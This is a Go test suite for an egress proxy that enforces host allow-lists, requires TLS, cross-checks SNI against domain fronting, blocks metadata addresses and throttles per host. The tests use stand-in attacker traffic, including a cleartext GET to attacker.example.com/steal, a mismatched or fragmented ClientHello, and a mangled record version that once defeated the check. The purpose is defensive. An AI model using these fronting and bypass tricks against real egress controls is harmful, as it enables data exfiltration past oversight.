package egress

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"go.uber.org/zap"
)

// These tests are the executable acceptance bar for
// specs/langy/langy-egress-enforcement.feature (ADR-076). They exercise the
// adapter's decision pipeline end-to-end (a real CONNECT over a loopback
// socket), not string assertions: a denied destination must never be dialed,
// a cleartext forward must be refused, a listed host must tunnel, and the
// per-destination throttle must slow one host without slowing another.

// waitForListenerOrFail blocks until the adapter's loopback port accepts a
// connection, so a test never races the serve goroutine's bind.
func waitForListenerOrFail(t *testing.T, port int) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 50*time.Millisecond)
		if err == nil {
			_ = conn.Close()
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("egress adapter did not bind 127.0.0.1:%d in time", port)
}

// recordingMonitor captures every flagged decision so a test can assert that
// enforcement is ALSO monitored (rung 0).
type recordingMonitor struct {
	mu     sync.Mutex
	events []egressEvent
}

func (m *recordingMonitor) record(e egressEvent) {
	m.mu.Lock()
	m.events = append(m.events, e)
	m.mu.Unlock()
}

func (m *recordingMonitor) decisions() []egressDecision {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]egressDecision, 0, len(m.events))
	for _, e := range m.events {
		out = append(out, e.Decision)
	}
	return out
}

func (m *recordingMonitor) has(d egressDecision) bool {
	for _, got := range m.decisions() {
		if got == d {
			return true
		}
	}
	return false
}

// echoUpstream is a stand-in destination that echoes whatever it receives, so
// an established tunnel is observable end-to-end.
type echoUpstream struct {
	ln       net.Listener
	accepted int32
	mu       sync.Mutex
}

func startEchoUpstream(t *testing.T) *echoUpstream {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("echo listen: %v", err)
	}
	e := &echoUpstream{ln: ln}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			e.mu.Lock()
			e.accepted++
			e.mu.Unlock()
			go func(c net.Conn) {
				defer c.Close()
				buf := make([]byte, 4096)
				for {
					n, err := c.Read(buf)
					if n > 0 {
						_, _ = c.Write(buf[:n])
					}
					if err != nil {
						return
					}
				}
			}(conn)
		}
	}()
	t.Cleanup(func() { _ = ln.Close() })
	return e
}

// dialRecorder wraps a dial func to (a) record which authorities were dialed
// and (b) route every dial to the echo upstream regardless of the requested
// host, so realistic FQDNs can be used while everything lands on loopback.
type dialRecorder struct {
	echoAddr string
	mu       sync.Mutex
	dialed   []string
}

func (d *dialRecorder) dial(ctx context.Context, network, addr string) (net.Conn, error) {
	d.mu.Lock()
	d.dialed = append(d.dialed, addr)
	d.mu.Unlock()
	return net.Dial("tcp", d.echoAddr)
}

func (d *dialRecorder) dialedAuthority(authority string) bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	for _, a := range d.dialed {
		if a == authority {
			return true
		}
	}
	return false
}

// harness bundles an adapter with its monitor + dial recorder.
type harness struct {
	adapter  *egressAdapter
	monitor  *recordingMonitor
	dialer   *dialRecorder
	proxyURL string
}

func newHarness(t *testing.T, cfg egressAdapterConfig) *harness {
	t.Helper()
	echo := startEchoUpstream(t)
	mon := &recordingMonitor{}
	dialer := &dialRecorder{echoAddr: echo.ln.Addr().String()}
	cfg.monitor = mon
	cfg.dial = dialer.dial
	cfg.log = zap.NewNop()

	adapter, err := startEgressAdapter(0, cfg)
	if err != nil {
		t.Fatalf("startEgressAdapter: %v", err)
	}
	t.Cleanup(adapter.shutdown)
	waitForListenerOrFail(t, adapter.port)

	return &harness{
		adapter:  adapter,
		monitor:  mon,
		dialer:   dialer,
		proxyURL: fmt.Sprintf("127.0.0.1:%d", adapter.port),
	}
}

// sendCONNECT dials the proxy and issues a CONNECT for authority, returning the
// raw connection (positioned at the tunnel start) and the HTTP status code.
func (h *harness) sendCONNECT(t *testing.T, authority string) (net.Conn, int) {
	t.Helper()
	conn, err := net.Dial("tcp", h.proxyURL)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	if _, err := fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", authority, authority); err != nil {
		t.Fatalf("write CONNECT: %v", err)
	}
	return conn, readResponseStatus(t, conn)
}

// readResponseStatus reads bytes up to the header terminator and parses the
// status code, leaving the connection positioned exactly at the tunnel start
// (no over-read into tunnel bytes).
func readResponseStatus(t *testing.T, conn net.Conn) int {
	t.Helper()
	var buf []byte
	one := make([]byte, 1)
	for {
		n, err := conn.Read(one)
		if n > 0 {
			buf = append(buf, one[0])
			if bytes.HasSuffix(buf, []byte("\r\n\r\n")) {
				break
			}
		}
		if err != nil {
			t.Fatalf("read response head: %v (got %q)", err, buf)
		}
	}
	line := string(buf)
	fields := strings.SplitN(line, " ", 3)
	if len(fields) < 2 {
		t.Fatalf("malformed status line: %q", line)
	}
	code, err := strconv.Atoi(fields[1])
	if err != nil {
		t.Fatalf("parse status code from %q: %v", line, err)
	}
	return code
}

func baseCfg() egressAdapterConfig {
	return egressAdapterConfig{
		conversationID: "conv-egress-test",
		throttle:       defaultThrottleConfig(),
		requireTLS:     true,
		sniCrossCheck:  false,
	}
}

func TestCheckedDialAddressRejectsPrivateResolution(t *testing.T) {
	cfg := baseCfg()
	cfg.resolve = func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("169.254.169.254")}, nil
	}
	a := &egressAdapter{cfg: cfg}
	if _, err := a.checkedDialAddress(context.Background(), "metadata.google.internal", "443"); err == nil {
		t.Fatal("private resolved address was accepted")
	}
}

func TestCheckedDialAddressPinsPublicResolution(t *testing.T) {
	cfg := baseCfg()
	cfg.resolve = func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("8.8.8.8")}, nil
	}
	a := &egressAdapter{cfg: cfg}
	got, err := a.checkedDialAddress(context.Background(), "example.com", "443")
	if err != nil || got != "8.8.8.8:443" {
		t.Fatalf("checked address = %q, err = %v", got, err)
	}
}

// ---- Rung 2: allow-list set means restrict to it ----

// @scenario "With an allow-list set, a listed host is allowed"
// @scenario "TLS egress to an allowed host still succeeds"
func TestEgress_ListedHostIsAllowedAndTunnels(t *testing.T) {
	cfg := baseCfg()
	cfg.policy = egressPolicy{allowlist: []string{"registry.npmjs.org"}}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "registry.npmjs.org:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("listed host got status %d, want 200", status)
	}

	// The tunnel is real: bytes we write echo back through the upstream.
	if _, err := conn.Write([]byte("ping")); err != nil {
		t.Fatalf("tunnel write: %v", err)
	}
	got := make([]byte, 4)
	if _, err := conn.Read(got); err != nil {
		t.Fatalf("tunnel read: %v", err)
	}
	if string(got) != "ping" {
		t.Fatalf("tunnel echoed %q, want %q", got, "ping")
	}
	if !h.dialer.dialedAuthority("registry.npmjs.org:443") {
		t.Fatalf("expected the listed host to be dialed")
	}
	if !h.monitor.has(egressAllowedListed) {
		t.Fatalf("expected an allowed_listed flag, got %v", h.monitor.decisions())
	}
}

// @scenario "With an allow-list set, a non-listed host is blocked and flagged"
func TestEgress_NonListedHostIsDeniedAndNeverDialed(t *testing.T) {
	cfg := baseCfg()
	cfg.policy = egressPolicy{allowlist: []string{"registry.npmjs.org"}}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "attacker.example.com:443")
	defer conn.Close()
	if status != 403 {
		t.Fatalf("non-listed host got status %d, want 403", status)
	}
	// The security-critical assertion: the destination is never contacted, so
	// no bytes could leave the pod toward it.
	if h.dialer.dialedAuthority("attacker.example.com:443") {
		t.Fatalf("denied destination was dialed — bytes could have leaked")
	}
	if !h.monitor.has(egressDenied) {
		t.Fatalf("expected a denied flag, got %v", h.monitor.decisions())
	}
}

// ---- Rung 2 default: no allow-list means monitor, not block ----

// @scenario "With no allow-list, outbound traffic is monitored but allowed"
// @scenario "An install that configures nothing upgrades into watching, not blocking"
func TestEgress_NoAllowlistAllowsButFlagsMonitorOnly(t *testing.T) {
	cfg := baseCfg()
	cfg.policy = egressPolicy{} // no customer list, floor unset, enforceFloor off
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "some-new-host.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("monitor-only host got status %d, want 200 (nothing blocked)", status)
	}
	if !h.dialer.dialedAuthority("some-new-host.example:443") {
		t.Fatalf("expected the host to be dialed in monitor-only mode")
	}
	if !h.monitor.has(egressAllowedMonitor) {
		t.Fatalf("expected an allowed_monitor flag, got %v", h.monitor.decisions())
	}
	if h.monitor.has(egressDenied) {
		t.Fatalf("monitor-only mode must not deny on allow-list grounds")
	}
}

// ---- Rung 3: always-on FQDN floor ----

// @scenario "Structural destinations stay reachable regardless of allow-list"
func TestEgress_FloorHostAllowedEvenUnderRestrictiveList(t *testing.T) {
	cfg := baseCfg()
	// Customer restricts to one host; the floor must still let structural
	// destinations (github) through — floor ∪ list, floor is additive.
	cfg.policy = egressPolicy{
		allowlist: []string{"registry.npmjs.org"},
		floor:     []string{"github.com", "api.github.com"},
	}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "api.github.com:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("floor host got status %d, want 200", status)
	}
	if !h.monitor.has(egressAllowedFloor) {
		t.Fatalf("expected an allowed_floor flag, got %v", h.monitor.decisions())
	}
}

// @scenario "The floor composes with, and is not widened by, an empty customer list"
func TestEgress_EmptyListDoesNotWidenOrDenyOutsideFloor(t *testing.T) {
	cfg := baseCfg()
	// Floor configured, no customer list, floor NOT enforced (default): a host
	// outside the floor is allowed (monitor-only), not denied and not
	// allow-listed.
	cfg.policy = egressPolicy{floor: []string{"github.com"}, enforceFloor: false}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "outside-floor.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("outside-floor host got status %d, want 200 (monitor-only)", status)
	}
	if !h.monitor.has(egressAllowedMonitor) {
		t.Fatalf("expected allowed_monitor, got %v", h.monitor.decisions())
	}
}

func TestEgress_EnforceFloorDeniesOutsideFloorWithoutCustomerList(t *testing.T) {
	cfg := baseCfg()
	// Operator flips the rung-3 lever: the floor becomes a hard ceiling even
	// without a customer list.
	cfg.policy = egressPolicy{floor: []string{"github.com"}, enforceFloor: true}
	h := newHarness(t, cfg)

	denied, status := h.sendCONNECT(t, "outside-floor.example:443")
	defer denied.Close()
	if status != 403 {
		t.Fatalf("with enforceFloor on, outside-floor host got %d, want 403", status)
	}
	if h.dialer.dialedAuthority("outside-floor.example:443") {
		t.Fatalf("enforced-floor deny must not dial the destination")
	}

	allowed, status := h.sendCONNECT(t, "github.com:443")
	defer allowed.Close()
	if status != 200 {
		t.Fatalf("floor host under enforceFloor got %d, want 200", status)
	}
}

// ---- Rung 1a: require TLS ----

// @scenario "Cleartext egress to an external host is refused"
func TestEgress_CleartextForwardIsRefused(t *testing.T) {
	cfg := baseCfg()
	cfg.policy = egressPolicy{} // even monitor-only refuses cleartext
	h := newHarness(t, cfg)

	conn, err := net.Dial("tcp", h.proxyURL)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	// Absolute-form plain-HTTP proxy request (cleartext), not a CONNECT.
	if _, err := fmt.Fprintf(conn,
		"GET http://attacker.example.com/steal HTTP/1.1\r\nHost: attacker.example.com\r\n\r\n"); err != nil {
		t.Fatalf("write plain request: %v", err)
	}
	status := readResponseStatus(t, conn)
	if status != 403 {
		t.Fatalf("cleartext forward got status %d, want 403", status)
	}
	if h.dialer.dialedAuthority("attacker.example.com:80") {
		t.Fatalf("cleartext destination must never be dialed")
	}
	if !h.monitor.has(egressDeniedCleartext) {
		t.Fatalf("expected a denied_cleartext flag, got %v", h.monitor.decisions())
	}
}

func TestEgress_NonTLSPortIsRefusedWhenRequireTLS(t *testing.T) {
	cfg := baseCfg()
	cfg.policy = egressPolicy{allowlist: []string{"registry.npmjs.org"}}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "registry.npmjs.org:22")
	defer conn.Close()
	if status != 403 {
		t.Fatalf("CONNECT to :22 under require-TLS got %d, want 403", status)
	}
}

// ---- Rung 3 cross-check: SNI must match the authorized authority ----

// The base case of the anti-fronting refusal, driven by a REAL tls.Client so
// the bytes on the wire are a genuine handshake rather than a fixture: a
// mismatching SNI is refused before the dial, and flagged as an SNI mismatch —
// the two Then clauses of the scenario below. The scenario's FRAGMENTATION
// clause is pinned separately, by TestEgress_FragmentedSNIMismatchIsRefused-
// BeforeDial and by TestPeekClientHelloSNI_ReassemblesAFragmentedHello; this
// test is the unfragmented sibling, not a substitute for either.
// @scenario "A ClientHello split across TLS records still reveals its SNI"
func TestEgress_SNIMismatchIsRefusedBeforeDial(t *testing.T) {
	cfg := baseCfg()
	cfg.sniCrossCheck = true
	// `allowed.example` is on the list; `attacker.example` is not. A client
	// that CONNECTs to the allowed authority but negotiates TLS with the
	// attacker SNI (domain-fronting) must be refused, and the destination never
	// dialed.
	cfg.policy = egressPolicy{allowlist: []string{"allowed.example"}}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "allowed.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("authority passed the list but CONNECT got %d, want 200", status)
	}
	// Drive a real ClientHello carrying the mismatched SNI.
	tlsConn := tls.Client(conn, &tls.Config{
		ServerName:         "attacker.example",
		InsecureSkipVerify: true,
	})
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	if err := tlsConn.Handshake(); err == nil {
		t.Fatalf("handshake unexpectedly succeeded; adapter should have refused the SNI mismatch")
	}
	if h.dialer.dialedAuthority("allowed.example:443") {
		t.Fatalf("SNI mismatch must be refused BEFORE dialing the destination")
	}
	if !h.monitor.has(egressDeniedSNIMismatch) {
		t.Fatalf("expected a denied_sni_mismatch flag, got %v", h.monitor.decisions())
	}
}

// enforcingSNICfg is the posture the fail-closed branch governs: an allow-list
// is set, the cross-check is on, and the peek gives up quickly so a stalling
// client does not add seconds to the suite.
func enforcingSNICfg() egressAdapterConfig {
	cfg := baseCfg()
	cfg.sniCrossCheck = true
	cfg.sniPeekTimeout = 250 * time.Millisecond
	cfg.policy = egressPolicy{allowlist: []string{"allowed.example"}}
	return cfg
}

// The branch these three cover had NO decision-level coverage: the whole
// `case sni == "" && sniUnreadable(...)` arm could be deleted and the package
// stayed green, because the only tests were over the pure helper `sniUnreadable`
// (whose body is `return sawHandshake || err != nil`). What was unpinned is the
// property that actually matters — that an unreadable hello never reaches the
// destination while a policy is enforcing.

// @scenario "An unreadable ClientHello is refused while a policy is enforcing"
func TestEgress_StalledClientHelloIsRefusedBeforeDial(t *testing.T) {
	h := newHarness(t, enforcingSNICfg())

	// The cheapest bypass there is: CONNECT, then say nothing. The peek read
	// errors before a complete record header, so `sawHandshake` stays false —
	// keying the branch on that alone is what a `sleep` used to defeat.
	conn, status := h.sendCONNECT(t, "allowed.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("authority is allow-listed but CONNECT got %d, want 200", status)
	}
	waitForDecision(t, h, egressDeniedSNIUnreadable)

	if h.dialer.dialedAuthority("allowed.example:443") {
		t.Fatal("an unreadable ClientHello must be refused BEFORE dialing the destination")
	}
}

// The P0 this review caught: one byte of legacy_record_version turned the
// cross-check off. RFC 8446 §5.1 says that field MUST be ignored, so the
// destination parses the very hello the guard declined to read.
// @scenario "A ClientHello with an implausible record version is refused"
func TestEgress_ImplausibleRecordVersionIsRefusedBeforeDial(t *testing.T) {
	h := newHarness(t, enforcingSNICfg())

	conn, status := h.sendCONNECT(t, "allowed.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("authority is allow-listed but CONNECT got %d, want 200", status)
	}

	hello := clientHelloFor(t, "attacker.example")
	hello[2] = 5 // 0x0301 -> 0x0305: deprecated field, ignored downstream.
	if _, err := conn.Write(hello); err != nil {
		t.Fatalf("write hello: %v", err)
	}
	waitForDecision(t, h, egressDeniedSNIUnreadable)

	if h.dialer.dialedAuthority("allowed.example:443") {
		t.Fatal("a record version we cannot follow must be refused BEFORE dialing")
	}
}

// The stock posture blocks nothing, and must keep blocking nothing. Dropping
// `a.cfg.policy.enforcing()` from the guard would turn every monitor-only
// install into one that hard-denies unreadable handshakes — a silent breach of
// the ADR's "unset = watch" guarantee.
//
// The hello is deliberately UNREADABLE — the same one-byte
// legacy_record_version mangling the sibling implausible-version test uses — so
// the peek returns no SNI and reports the stream as unreadable. That drives
// execution into `case sni == "" && sniUnreadable(...)` with every other
// conjunct satisfied (`sni` is empty, the peek errored, and the authority is a
// name rather than an IP literal), leaving `enforcing()` as the ONE term
// deciding allow vs. deny. Delete it and this test denies and never dials.
//
// A READABLE hello whose SNI equals the authority — what this test used to send
// — reaches neither arm of the switch, so it could not fail for that property
// however the guard were rewritten.
// @scenario "An unreadable ClientHello is left alone under monitor-only"
func TestEgress_UnreadableClientHelloIsAllowedUnderMonitorOnly(t *testing.T) {
	cfg := baseCfg()
	cfg.sniCrossCheck = true
	cfg.sniPeekTimeout = 250 * time.Millisecond
	cfg.policy = egressPolicy{} // no allow-list, no floor: watching, not blocking.
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "anywhere.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("monitor-only must not block, got %d", status)
	}
	hello := clientHelloFor(t, "anywhere.example")
	hello[2] = 5 // 0x0301 -> 0x0305: a version no TLS record uses.
	if _, err := conn.Write(hello); err != nil {
		t.Fatalf("write hello: %v", err)
	}

	waitFor(t, func() bool { return h.dialer.dialedAuthority("anywhere.example:443") },
		func() string { return "monitor-only must still dial the destination" })
	if h.monitor.has(egressDeniedSNIUnreadable) {
		t.Fatalf("monitor-only must not deny, got %v", h.monitor.decisions())
	}
	// "the flow is still monitored and attributable": allowed, and flagged.
	if !h.monitor.has(egressAllowedMonitor) {
		t.Fatalf("expected an allowed_monitor flag, got %v", h.monitor.decisions())
	}
}

// ---- Rung 3 cross-check: the exemptions, pinned at the adapter ----

// The adapter-level half of the fragmentation regression. The peek-level test
// proves the SNI is recovered out of record 2; this proves the adapter ACTS on
// what it recovered — a hostile client that hides its SNI behind a record
// boundary is refused, and the destination is never dialed.
// @scenario "A ClientHello split across TLS records still reveals its SNI"
func TestEgress_FragmentedSNIMismatchIsRefusedBeforeDial(t *testing.T) {
	h := newHarness(t, enforcingSNICfg())

	conn, status := h.sendCONNECT(t, "allowed.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("authority is allow-listed but CONNECT got %d, want 200", status)
	}

	// Split right after the handshake header, so the server_name extension lands
	// wholly in the second record — the shape a single-record peek walked past.
	fragmented := refragment(t, clientHelloFor(t, "attacker.example"), 8)
	if _, err := conn.Write(fragmented); err != nil {
		t.Fatalf("write fragmented hello: %v", err)
	}
	waitForDecision(t, h, egressDeniedSNIMismatch)

	if h.dialer.dialedAuthority("allowed.example:443") {
		t.Fatal("a fragmented mismatching SNI must be refused BEFORE dialing the destination")
	}
}

// The cross-check governs TLS and nothing else. A stream that is CLEANLY not
// TLS — a complete record header carrying a non-handshake content type — must
// still tunnel under an enforcing policy, because require-TLS is the rung that
// governs cleartext. Make the not-TLS exit an error (or drop the clean-exit
// case from sniUnreadable) and this denies an allow-listed destination.
// @scenario "A tunnel that is not TLS at all is unaffected by the cross-check"
func TestEgress_NonTLSTunnelIsNotRefusedByTheCrossCheck(t *testing.T) {
	h := newHarness(t, enforcingSNICfg())

	conn, status := h.sendCONNECT(t, "allowed.example:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("authority is allow-listed but CONNECT got %d, want 200", status)
	}
	if _, err := conn.Write([]byte("GET / HTTP/1.1\r\nHost: allowed.example\r\n\r\n")); err != nil {
		t.Fatalf("write non-tls bytes: %v", err)
	}

	waitFor(t, func() bool { return h.dialer.dialedAuthority("allowed.example:443") },
		func() string { return "a cleanly non-TLS tunnel must still reach its destination" })
	if h.monitor.has(egressDeniedSNIUnreadable) {
		t.Fatalf("the cross-check must not refuse a non-TLS tunnel, got %v", h.monitor.decisions())
	}
}

// RFC 6066 forbids server_name for a bare address, so a conforming client sends
// none and the peek can only report "unreadable". Sending nothing at all here
// satisfies every other conjunct of the fail-closed guard — empty SNI, a peek
// that errored, an enforcing policy — which leaves `!isIPLiteral(host)` as the
// only term keeping an allow-listed IP out of a deny. Delete it and every
// spec-conforming client on a bare-IP authority is refused.
// @scenario "A bare IP authority is exempt from the SNI requirement"
func TestEgress_BareIPAuthorityIsNotRefusedOnSNIGrounds(t *testing.T) {
	cfg := baseCfg()
	cfg.sniCrossCheck = true
	cfg.sniPeekTimeout = 250 * time.Millisecond
	cfg.policy = egressPolicy{allowlist: []string{"203.0.113.10"}}
	h := newHarness(t, cfg)

	conn, status := h.sendCONNECT(t, "203.0.113.10:443")
	defer conn.Close()
	if status != 200 {
		t.Fatalf("allow-listed bare IP got status %d, want 200", status)
	}

	waitFor(t, func() bool { return h.dialer.dialedAuthority("203.0.113.10:443") },
		func() string { return "an allow-listed bare IP must not be refused for sending no SNI" })
	if h.monitor.has(egressDeniedSNIUnreadable) {
		t.Fatalf("a bare IP authority must not be denied on SNI grounds, got %v", h.monitor.decisions())
	}
}

// waitForDecision polls until the adapter records d, so the assertions do not
// race the goroutine that handles the tunnel.
func waitForDecision(t *testing.T, h *harness, d egressDecision) {
	t.Helper()
	waitFor(t, func() bool { return h.monitor.has(d) },
		// Built at FAILURE time, not call time: the decisions slice is empty
		// when polling starts, so an eagerly-formatted message would report
		// "got []" on every timeout no matter what the adapter recorded.
		func() string {
			return fmt.Sprintf("expected decision %v, got %v", d, h.monitor.decisions())
		})
}

func waitFor(t *testing.T, cond func() bool, msg func() string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal(msg())
}

// ---- Rung 1b: per-destination throttle, keyed per host ----

// @scenario "A burst of new connections to a rare host is throttled"
func TestEgressThrottle_ConnectionBurstTarpitsOneHostOnly(t *testing.T) {
	cfg := throttleConfig{
		connWindow:          time.Second,
		maxConnsPerWindow:   3,
		tarpitPerExcessConn: 100 * time.Millisecond,
		maxTarpit:           time.Second,
		byteBurst:           1 << 20,
		bytesPerSec:         1 << 20,
	}
	th := newEgressThrottle(cfg)

	// First 3 connections to host A are under budget.
	for i := 0; i < 3; i++ {
		if d, throttled := th.admitConnection("a.example"); throttled || d != 0 {
			t.Fatalf("conn %d to A should be under budget, got throttled=%v delay=%v", i, throttled, d)
		}
	}
	// The 4th trips the throttle with a tar-pit delay.
	d, throttled := th.admitConnection("a.example")
	if !throttled || d <= 0 {
		t.Fatalf("burst to A should be throttled, got throttled=%v delay=%v", throttled, d)
	}
	// A different host is unaffected — the throttle is per destination.
	if d, throttled := th.admitConnection("b.example"); throttled || d != 0 {
		t.Fatalf("host B must not be slowed by host A's burst, got throttled=%v delay=%v", throttled, d)
	}
}

// @scenario "A high-volume flow to a single destination is throttled and flagged"
func TestEgressThrottle_ByteVolumeThrottlesOneHostNotAnother(t *testing.T) {
	cfg := throttleConfig{
		connWindow:        time.Minute,
		maxConnsPerWindow: 1000,
		byteBurst:         1 << 10,   // 1 KiB flows free, then the cap engages
		bytesPerSec:       256 << 10, // fast enough to drain in the test window
	}
	th := newEgressThrottle(cfg)
	limA := th.limiterFor("a.example")
	limB := th.limiterFor("b.example")

	// Stream well over the burst to host A: the copy must report throttling.
	payload := bytes.Repeat([]byte("x"), 8<<10) // 8 KiB
	var sink bytes.Buffer
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, throttledA, err := throttledCopy(ctx, &sink, bytes.NewReader(payload), limA)
	if err != nil {
		t.Fatalf("copy to A: %v", err)
	}
	if !throttledA {
		t.Fatalf("a large volume to A should have been throttled")
	}

	// A small flow to B stays under B's own burst — not slowed.
	var sinkB bytes.Buffer
	small := bytes.Repeat([]byte("y"), 512)
	_, throttledB, err := throttledCopy(ctx, &sinkB, bytes.NewReader(small), limB)
	if err != nil {
		t.Fatalf("copy to B: %v", err)
	}
	if throttledB {
		t.Fatalf("a small flow to B must not be throttled by A's volume")
	}
}
